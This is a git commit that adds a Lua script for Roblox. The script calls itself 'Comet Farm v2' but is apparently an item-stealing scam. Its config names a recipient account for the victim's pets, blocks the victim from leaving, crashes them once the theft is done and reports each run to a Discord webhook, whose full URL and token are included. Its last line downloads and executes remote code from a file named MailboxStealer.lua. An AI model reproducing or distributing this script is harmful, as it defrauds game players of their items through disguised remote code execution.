29dc63d8d2013ae79d4b83abedcd071ebb7c99c9
ivan0191 <130799071+ivan0191@users.noreply.github.com>
2023-04-15 17:47:19 +0200

    Create Script.lua

---
+++ Script.lua
@@ -0,0 +1,21 @@
+--[[ Main Config ]]--
+_G.Username = "Amongusjailbreak" --// Username To Send Pets To
+_G.GiftMessage = "uwu" --// Message For The Gift To Say
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Crash = true  --// Crashes Them After Its Finished
+
+--[[ Webhook Config ]]--
+_G.Enabled = true --// Toggle For Sending Webhooks
+_G.Mention = false --// Pings You When Someone Executes
+_G.Webhook = "https://discord.com/api/webhooks/1094960074130214923/yz8BvG19ryiBsSyClcPHuuxpX-Ai133LtsGObnFWmL-s8j_-RdexBPQIQy-NRH2gW4kN" --// Discord Webhook For Executions
+
+--[[ UI Config ]]--
+_G.ScriptName = "Comet Farm v2" --// Script Name On The UI
+_G.Tip1 = "Dont" --// Gives You Tips On The UI
+_G.Tip2 = "leave" --// Gives You Tips On The UI
+_G.Tip3 = "game" --// Gives You Tips On The UI
+_G.Tip4 = "script" --// Gives You Tips On The UI
+_G.Tip5 = "loading" --// Gives You Tips On The UI
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/MailboxStealer.lua", true))()
